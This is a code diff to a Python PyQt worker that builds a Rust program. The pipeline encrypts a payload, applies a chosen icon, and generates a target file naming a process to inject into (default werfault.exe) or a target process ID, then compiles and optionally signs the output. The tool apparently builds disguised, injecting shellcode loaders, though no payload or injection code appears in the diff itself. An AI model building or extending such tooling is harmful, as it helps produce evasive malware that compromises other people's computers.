@@ -36,6 +36,8 @@ class WorkerThread(QThread):
         """执行完整的构建流程"""
         try:
             self._encrypt_payload()
+            self._update_icon_rc()
+            self._generate_target_rs()
             self._build_rust_project()
             output_file = self._copy_output()
             if self.params['sign_enable']:
@@ -73,16 +75,68 @@ class WorkerThread(QThread):
         
         self.progress_signal.emit(40)
 
+    def _update_icon_rc(self):
+        """更新icon.rc文件"""
+        self.log_signal.emit('更新图标资源...')
+        
+        icon_path = self.params['icon_path']
+        # 将反斜杠替换为正斜杠，以适应RC文件格式
+        icon_path_normalized = icon_path.replace('\\', '/')
+        template_path = os.path.join('templates', 'icon_rc.txt')
+        
+        with open(template_path, 'r') as f:
+            template = f.read()
+        
+        icon_rc_content = template.format(icon_path_normalized)
+        
+        with open('icon.rc', 'w') as f:
+            f.write(icon_rc_content)
+        
+        self.log_signal.emit(f'图标已设置为: {icon_path}')
+        self.progress_signal.emit(50)
+
+    def _generate_target_rs(self):
+        """生成target.rs文件"""
+        self.log_signal.emit('生成target.rs...')
+        
+        manifest = load_plugins_manifest()
+        run_modes = manifest['run_modes']
+        run_mode_id = self.params['run_mode']
+        
+        for rm in run_modes:
+            if rm['id'] == run_mode_id:
+                pattern = rm.get('pattern', 1)
+                if pattern == 2:
+                    template_path = os.path.join('templates', 'src_target2.txt')
+                    with open(template_path, 'r') as f:
+                        template = f.read()
+                    target_program = self.params.get('target_program', r'C:\Windows\System32\werfault.exe')
+                    content = template.format(target_program)
+                    with open('src/target.rs', 'w') as f:
+                        f.write(content)
+                    self.log_signal.emit('已生成target.rs (TARGET_PROGRAM)')
+                elif pattern == 3:
+                    template_path = os.path.join('templates', 'src_target3.txt')
+                    with open(template_path, 'r') as f:
+                        template = f.read()
+                    target_pid = self.params.get('target_pid', '0')
+                    content = template.format(target_pid)
+                    with open('src/target.rs', 'w') as f:
+                        f.write(content)
+                    self.log_signal.emit('已生成target.rs (TARGET_PID)')
+                else:
+                    self.log_signal.emit('无需生成target.rs')
+                break
+        
+        self.progress_signal.emit(60)
+
     def _build_rust_project(self):
         """构建Rust项目"""
         self.log_signal.emit('Rust 构建中...')
         
         # 使用用户选择的target
         self.target = self.params.get('target', 'x86_64-pc-windows-msvc')
-        
-        env = os.environ.copy()
-        env['ICON_PATH'] = self.params['icon_path']
-        env['RUN_MODE'] = self.params['run_mode']
+
         
         # 动态生成Cargo feature参数
         features = self._build_features_list()
@@ -98,7 +152,7 @@ class WorkerThread(QThread):
             f'--features={features_str}'
         ]
         
-        result = subprocess.run(build_cmd, capture_output=True, text=True, check=True, env=env)
+        result = subprocess.run(build_cmd, capture_output=True, text=True, check=True)
         self.log_signal.emit(result.stdout)
         if result.stderr:
             self.log_signal.emit(result.stderr)
